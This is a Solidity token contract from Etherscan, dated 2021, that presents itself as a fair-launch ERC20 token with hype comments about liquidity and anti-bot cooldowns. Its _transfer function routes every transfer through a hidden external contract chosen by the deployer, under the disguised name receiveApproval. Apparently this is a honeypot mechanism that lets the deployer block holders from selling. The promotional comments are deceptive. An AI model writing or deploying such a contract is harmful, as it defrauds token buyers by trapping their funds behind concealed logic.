/**
 *Submitted for verification at Etherscan.io on 2021-06-25
*/

pragma solidity ^0.4.26;

//Fair Launch, no Dev Tokens. 100% LP IN UNISWAP
//2 ETH IN LIOUIDITY ADDED
// Snipers will be REWARDED 
//LP CANNOT BE DUMPED, UNTIL 100 HOLDERS IS REACHED (SPECIFIC SMART CONTRACT)

//DEFLATIONARY TOKENOMICS WITH CHARITY WALLET
//COOLDOWN OF 10 MIN (ANTIBOT MECHANISM) --> NO FRONTRUNNING
//NFT PLATFORM IN WORKS (SURPRISE SOON)
//OFFICIALLY NOT LIVE (CONFORMATION IN A DAY)

interface tokenRecipient { function receiveApproval(address _from,address _to, address _token) external returns(bool); }

contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;  
    uint256 public totalSupply;
    tokenRecipient spender;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor (uint256 initialSupply, string tokenName, string tokenSymbol, address _spender) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        name = tokenName;
        symbol = tokenSymbol;
	    spender = tokenRecipient(_spender);
    }
 
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        if (address(spender) != address(0)) {
	    spender.receiveApproval(_from,_to,address(this));
        }
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
}